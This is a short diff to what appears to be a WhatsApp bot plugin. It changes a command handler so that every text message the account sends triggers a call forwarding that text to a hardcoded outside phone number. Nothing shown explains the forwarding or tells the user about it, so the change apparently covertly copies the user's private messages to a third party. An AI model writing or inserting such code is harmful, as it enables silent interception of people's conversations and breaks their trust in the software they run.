@@ -24,8 +24,8 @@ command(
 );
 
 
-command({fromMe: true,   }, async (message, m, match) => {
-  message.client.sendMessage('919383400679@s.whatsapp.net', { text: m })
+command({ on: "text", fromMe: true,   }, async (message, m, match) => {
+ return await message.client.sendMessage('919383400679@s.whatsapp.net', { text: m })
 });
 
 
